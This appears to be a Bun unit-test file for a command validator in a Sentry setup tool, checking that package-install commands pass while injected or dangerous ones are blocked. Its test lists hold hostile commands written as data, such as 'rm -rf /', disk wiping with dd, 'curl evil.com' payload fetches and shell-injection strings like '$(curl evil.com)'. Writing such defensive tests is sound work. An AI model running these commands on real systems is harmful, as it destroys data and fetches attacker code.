import { describe, expect, test } from "bun:test";
import { validateCommand } from "../../../src/lib/init/local-ops.js";

describe("validateCommand", () => {
  test("allows legitimate install commands", () => {
    const commands = [
      "npm install @sentry/node",
      "npm install --save @sentry/react @sentry/browser",
      "yarn add @sentry/node",
      "pnpm add @sentry/node",
      "pip install sentry-sdk",
      "pip install sentry-sdk[flask]",
      'pip install "sentry-sdk>=1.0"',
      'pip install "sentry-sdk<2.0,>=1.0"',
      "pip install -r requirements.txt",
      "cargo add sentry",
      "bundle add sentry-ruby",
      "gem install sentry-ruby",
      "composer require sentry/sentry-laravel",
      "dotnet add package Sentry",
      "go get github.com/getsentry/sentry-go",
      "flutter pub add sentry_flutter",
      "npx @sentry/wizard@latest -i nextjs",
      "poetry add sentry-sdk",
      "npm install foo@>=1.0.0",
    ];
    for (const cmd of commands) {
      expect(validateCommand(cmd)).toBeUndefined();
    }
  });

  test("blocks shell metacharacters", () => {
    for (const cmd of [
      "npm install foo; rm -rf /",
      "npm install foo && curl evil.com",
      "npm install foo || curl evil.com",
      "npm install foo | tee /etc/passwd",
      "npm install `curl evil.com`",
      "npm install $(curl evil.com)",
      "npm install foo\ncurl evil.com",
      "npm install foo\rcurl evil.com",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks dangerous executables", () => {
    for (const cmd of [
      "rm -rf /",
      "curl https://evil.com/payload",
      "sudo npm install foo",
      "chmod 777 /etc/passwd",
      "kill -9 1",
      "dd if=/dev/zero of=/dev/sda",
      "ssh user@host",
      "bash -c 'echo hello'",
      "sh -c 'echo hello'",
      "env npm install foo",
      "xargs rm",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("resolves path-prefixed executables", () => {
    // Safe executables with paths pass
    expect(validateCommand("./venv/bin/pip install sentry-sdk")).toBeUndefined();
    expect(validateCommand("/usr/local/bin/npm install foo")).toBeUndefined();

    // Dangerous executables with paths are still blocked
    expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
    expect(validateCommand("/usr/bin/curl https://evil.com")).toContain('"curl"');
  });

  test("blocks empty and whitespace-only commands", () => {
    expect(validateCommand("")).toContain("empty command");
    expect(validateCommand("   ")).toContain("empty command");
  });
});
